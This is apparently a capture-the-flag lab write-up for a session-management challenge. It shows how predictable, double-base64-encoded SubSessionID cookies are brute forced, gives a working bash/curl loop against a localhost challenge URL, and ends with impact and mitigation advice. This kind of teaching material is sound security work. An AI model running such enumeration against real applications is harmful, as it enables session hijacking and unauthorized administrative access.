# Session Management Challenge Four

## Description
Only an admin of the following sub-application can retrieve the result key. This challenge demonstrates how predictable session identifiers can be exploited through brute force techniques.

## Solution
Similar to previous challenges, this challenge involves a cookie parameter that can be manipulated. In this case, we can exploit the SubSessionID cookie by brute forcing values from `0000000000000001` to `0000000000000100` with double base64 encoding.

## Steps to Reproduce

### Step 1
Open your browser console's Network tab and click the `Admin Only Button`. Copy the request as a curl command.

![](/writeups/assets/images/session/session-4-1.jpg)

### Step 2
Update this bash script with your domain and cookie information. Other values can remain the same. After running the script, you will see the result key in the response.

```bash
for i in {1..100}; do
  padded=$(printf "%016d" "$i")

  encoded=$(echo -n "$padded" | base64 | base64)

  response=$(curl 'https://localhost/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6' \
    -X POST \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Cookie: securityMisconfigLesson=2d7556a0d1e218359db588ca9a3c1a4bfc237862816b68784d98845f04270265; checksum=dXNlclJvbGU9dXNlcg==; current=WjNWbGMzUXhNZz09; SubSessionID=$encoded; JSESSIONID=C3BDC7B1C469DCC40EC04516622D2539; token=-113563139812985887261408209985722099811" \
    --data-raw 'userId=0000000000000001&useSecurity=true' \
    -k -s)

  if echo "$response" | grep -q "Welcome"; then
    echo ">>> Trying SubSessionID=$encoded (from $padded)"
    echo "$response"
    echo
  fi
done
```

## Exploit
This vulnerability demonstrates insecure session management where session identifiers are predictable and can be brute forced. The exploit works because:

1. The SubSessionID cookie uses a predictable numbering scheme (0000000000000001 to 0000000000000100)
2. The values are double base64-encoded, making them appear more complex but still predictable
3. An attacker can enumerate all possible values within the range to find a valid session
4. When a valid session is found, the application responds with the "Welcome" message and the result key

The vulnerability allows an attacker to:
1. Brute force session identifiers to gain unauthorized access
2. Access administrative functionality without proper authentication
3. Bypass session management controls through systematic enumeration

## Impact
Predictable session identifiers can lead to serious security issues:

1. **Session Hijacking**: Attackers can gain unauthorized access to user sessions
2. **Privilege Escalation**: Access to administrative accounts with elevated privileges
3. **Unauthorized Data Access**: Access to sensitive information belonging to other users
4. **System Compromise**: Potential for complete system takeover through administrative access
5. **Reputational Damage**: Loss of user trust when security flaws are discovered

## Mitigation
To prevent predictable session identifier vulnerabilities:

1. **Cryptographically Secure Identifiers**: Use cryptographically secure random values for session identifiers
2. **Sufficient Entropy**: Ensure session identifiers have sufficient entropy to prevent brute force attacks
3. **Session Expiration**: Implement proper session timeout and invalidation mechanisms
4. **Rate Limiting**: Implement rate limiting on session-related requests
5. **Secure Session Storage**: Store session data securely on the server side
6. **Regular Security Testing**: Include session management testing in security assessments
7. **Follow Secure Coding Practices**: Adopt standards and guidelines for secure session management

---

[← Previous](./session-management-challenge-3.md) | [Next →](./session-management-challenge-5.md)

